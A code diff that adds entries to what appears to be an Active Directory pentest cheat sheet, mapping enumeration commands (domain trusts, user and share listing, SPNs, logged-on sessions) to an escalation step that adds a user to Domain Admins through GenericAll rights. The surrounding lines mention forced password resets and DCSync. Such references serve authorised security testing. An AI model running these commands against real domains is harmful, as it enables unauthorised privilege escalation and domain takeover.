@@ -25,6 +25,12 @@ echo %USERDOMAIN% %LOGONSERVER%
 nltest /dsgetdc:<domain>
 ipconfig /all`,
                 },
+                {
+                    label: 'Domain + forest trusts',
+                    code: `nltest /domain_trusts /v
+nltest /trusted_domains
+# a trust = path to the parent/child domain (cross-domain attacks)`,
+                },
             ],
             tags: ['ad', 'domain', 'foothold', 'context'],
         },
@@ -73,6 +79,14 @@ Get-DomainObjectAcl -Identity <user> -ResolveGUIDs | ? {$_.ActiveDirectoryRights
                     code: `Get-DomainUser | select samaccountname,description,pwdlastset
 Get-DomainComputer | select dnshostname,operatingsystem
 Find-DomainShare`,
+                },
+                {
+                    label: 'Native + PowerView quick wins',
+                    code: `net user /domain
+setspn -L <target>
+PsLoggedOn.exe \\\\<target>
+Find-DomainShare -CheckShareAccess
+Convert-SidToName <sid>`,
                 },
             ],
             tags: ['powerview', 'spn', 'acl', 'find-localadminaccess'],
@@ -146,6 +160,13 @@ net user <victim> <NewPass1!> /domain
 # bloodyAD --host <dc> -d <domain> -u <user> -p <pass> set password <victim> <NewPass1!>
 # WriteDacl -> grant yourself DCSync, then secretsdump`,
                 },
+                {
+                    label: 'GenericAll on a group -> add yourself',
+                    code: `# GenericAll over a privileged group (e.g. Domain Admins) -> add a user:
+net rpc group addmem "Domain Admins" <user> -U "<domain>/<you>%<pass>" -S <dc>
+# or PowerView:
+Add-DomainGroupMember -Identity 'Domain Admins' -Members <user>`,
+                },
             ],
             tags: ['acl', 'genericall', 'writedacl', 'dcsync-rights'],
         },
@@ -189,7 +210,8 @@ query user /server:<target>`,
         { from: 'bloodhound', to: 'sessions-enum', label: 'node = HasSession' },
         { from: 'spn-enum', to: 'kerberoast', label: 'request the TGS' },
         { from: 'acl-enum', to: 'force-change-password', label: 'GenericAll on a user' },
-        { from: 'acl-enum', to: 'dcsync', label: 'DCSync rights' },
+        { from: 'acl-enum', to: 'dcsync', label: 'DCSync rights' },        { from: 'acl-enum', to: 'domain-admin', label: 'GenericAll on a privileged group' },
+
         { from: 'sessions-enum', to: 'psexec-lateral', label: 'compromise that host' },
     ],
 }
